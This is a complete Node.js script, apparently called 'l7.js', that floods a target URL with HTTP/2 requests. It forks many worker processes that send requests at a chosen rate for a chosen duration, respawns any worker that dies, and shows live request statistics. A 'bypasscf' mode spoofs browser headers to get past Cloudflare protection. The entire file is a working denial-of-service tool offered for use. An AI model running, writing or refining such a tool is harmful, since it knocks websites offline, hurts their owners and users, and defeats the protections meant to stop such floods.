const cluster = require("cluster");
const os = require("os");
const http2 = require("http2");

const colors = {
    reset: "\x1b[0m",
    fgRed: "\x1b[31m",
    fgGreen: "\x1b[32m",
    fgYellow: "\x1b[33m",
    fgMagenta: "\x1b[35m",
    fgCyan: "\x1b[36m"
};

const emoji = {
    rocket: "🚀",
    thread: "🧵",
    request: "📡",
    check: "✅",
    timer: "⏱️",
    warning: "⚠️",
    stop: "🛑"
};

const args = process.argv.slice(2);
const target = args[0];
const thread = parseInt(args[1], 10);
const rpspt = parseInt(args[2], 10);
const method = args[3] ? args[3].toString().trim().toUpperCase() : "GET";
const methodx = args[4] && args[4].toLowerCase();
const times = parseInt(args[5]);

if (!target || isNaN(thread) || isNaN(rpspt) || (method !== "GET" && method !== "POST") || !methodx || (methodx !== "raw" && methodx !== "normal" && methodx !== "bypasscf") || isNaN(times) || (times < 10)) {
    console.log(
        `${colors.fgRed}${emoji.warning} Usage: node l7.js <url> <thread> <rate> <get/post> <bypasscf/normal/raw> <times>${colors.reset}\n` +
        `Example: node l7.js http://localhost:8080 50 156 GET raw 60\n` +
        `         node l7.js http://localhost:8080 50 156 POST normal 50\n` +
        `         node l7.js http://localhost:8080 50 156 GET bypass 40` +
        `${colors.fgRed}${emoji.warning}Warning: Times must be greater than 10 seconds!${colors.reset}`
    );
    process.exit(1);
}

const normalHeaders = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
};
const parsed = new URL(target);
const bypassHeaders =  {
    ":method": "GET",
    ":scheme": "https",
    ":authority": parsed.host,
    ":path": "/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "accept-encoding": "gzip, deflate, br",
    "upgrade-insecure-requests": "1",
    "sec-ch-ua": `"Chromium";v="116", "Not:A-Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document"
};
if (cluster.isPrimary) {
    console.log(colors.fgCyan + "=============================" + colors.reset);
    console.log(colors.fgMagenta + "           Stats             " + colors.reset);
    console.log(colors.fgCyan + "=============================" + colors.reset);
    console.log(`${emoji.rocket} Target: ${colors.fgYellow}${target}${colors.reset}`);
    console.log(`${emoji.thread} Threads: ${colors.fgYellow}${thread}${colors.reset}`);
    console.log(`${emoji.request} Rate per Thread: ${colors.fgYellow}${rpspt}${colors.reset}`);
    console.log(`${emoji.check} Method: ${colors.fgYellow}${method}${colors.reset}`);
    console.log(`${emoji.timer} Duration: ${colors.fgYellow}${times}${colors.reset} sec`);
    console.log(colors.fgCyan + "=============================" + colors.reset);

    let totalSent = 0;
    let startTime = Date.now();
    const workerStats = {};

    for (let i = 0; i < thread; i++) {
        const worker = cluster.fork();
        workerStats[worker.id] = 0;
        worker.on("message", (msg) => {
            if (msg && typeof msg.sent === "number") {
                workerStats[worker.id] = msg.sent;
            }
        });
    }

    cluster.on("exit", (worker, code, signal) => {
        console.log(`${colors.fgRed}${emoji.stop} Worker ${worker.process.pid} died with code ${code} and signal ${signal}${colors.reset}`);
        delete workerStats[worker.id];
        const newWorker = cluster.fork();
        workerStats[newWorker.id] = 0;
        newWorker.on("message", (msg) => {
            if (msg && typeof msg.sent === "number") {
                workerStats[newWorker.id] = msg.sent;
            }
        });
    });

    setTimeout(() => {
        console.log(`${colors.fgRed}${emoji.stop} Time limit of ${times} seconds reached. Forcefully stopping all workers...${colors.reset}`);
        for (const id in cluster.workers) {
            cluster.workers[id].kill("SIGKILL");
        }
        process.exit(0);
    }, times * 1000);

    setInterval(() => {
        totalSent = Object.values(workerStats).reduce((a, b) => a + b, 0);
        const elapsed = (Date.now() - startTime) / 1000;
        const avrps = elapsed > 0 ? (totalSent / elapsed).toFixed(0) : 0;
        process.stdout.write("\x1b[H\x1b[2J");
        console.log(
            `${colors.fgCyan}=============================${colors.reset}\n` +
            `${colors.fgCyan}          Stats             ${colors.reset}\n` +
            `${colors.fgCyan}=============================${colors.reset}\n` +
            `${colors.fgCyan}${emoji.request} Total Requests Sent: ${colors.fgGreen}${totalSent}${colors.reset}\n` +
            `${colors.fgCyan}${emoji.timer} Elapsed Time: ${colors.fgYellow}${elapsed.toFixed(1)}${colors.reset} sec\n` +
            `${colors.fgCyan}${emoji.check} Average RPS: ${colors.fgMagenta}${avrps}${colors.reset}\n` +
            `${colors.fgCyan}=============================${colors.reset}\n`
        );
    }, 1000);
} else {
    const url = new URL(target);
    let client = null;

    function connectClient() {
        if (client && !client.closed && !client.destroyed) {
            client.close();
        }
        client = http2.connect(url.origin);
        client.on("error", (err) => {
            console.error(`${colors.fgRed}${emoji.warning} HTTP/2 client error: ${err.message}${colors.reset}`);
            client = null;
        });
        client.on("goaway", () => {
            console.log(`${colors.fgYellow}${emoji.warning} HTTP/2 GOAWAY received, reconnecting...${colors.reset}`);
            client = null;
        });
    }

    let sent = 0;

    function createRequest(headers, body = null) {
        if (!client || client.closed || client.destroyed) {
            connectClient();
        }
        try {
            const req = client.request(headers);
            req.setEncoding("utf8");
            req.on("response", () => { });
            req.on("data", () => { });
            req.on("end", () => { });
            req.on("error", (err) => {
                if (err.code === "EPIPE") {
                    console.error(`${colors.fgRed}${emoji.warning} EPIPE error on request, continuing...${colors.reset}`);
                } else {
                    console.error(`${colors.fgRed}${emoji.warning} Request error: ${err.message}${colors.reset}`);
                }
                connectClient()
            });
            if (body) {
                try {
                    req.write(JSON.stringify(body));
                } catch (err) {
                    console.error(`${colors.fgRed}${emoji.warning} Error writing body: ${err.message}${colors.reset}`);
                }
            }
            req.end();
            return req;
        } catch (err) {
            console.error(`${colors.fgRed}${emoji.warning} Failed to create request: ${err.message}${colors.reset}`);
            connectClient();
            return null;
        }
    }

    async function sendRequestsLoop() {
        try {
            while (true) {
                for (let i = 0; i < rpspt; i++) {
                    let headers;
                    if (methodx === "bypasscf") {
                        headers = { ...bypassHeaders, ":path": url.pathname, ":method": method };
                        delete headers["Connection"];
                        if (method === "POST") headers["content-type"] = "application/json";
                    } else if (methodx === "normal") {
                        headers = { ...normalHeaders, ":path": url.pathname, ":method": method };
                        if (method === "POST") headers["content-type"] = "application/json";
                    } else {
                        headers = { ":path": url.pathname, ":method": method };
                        if (method === "POST") headers["content-type"] = "application/json";
                    }
                    if (createRequest(headers, method === "POST" ? { key: "value" } : null)) {
                        sent++;
                    }
                }
                if (process.send) process.send({ sent });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        } catch (err) {
            console.error(`${colors.fgRed}${emoji.warning} Error in sendRequestsLoop: ${err.message}${colors.reset}`);
            connectClient();
            await new Promise(resolve => setTimeout(resolve, 1000));
            sendRequestsLoop();
        }
    }

    process.on("uncaughtException", (err) => {
        console.error(`${colors.fgRed}${emoji.warning} Uncaught exception in worker ${process.pid}: ${err.message}${colors.reset}`);
        connectClient();
    });
    connectClient();
    sendRequestsLoop();
}
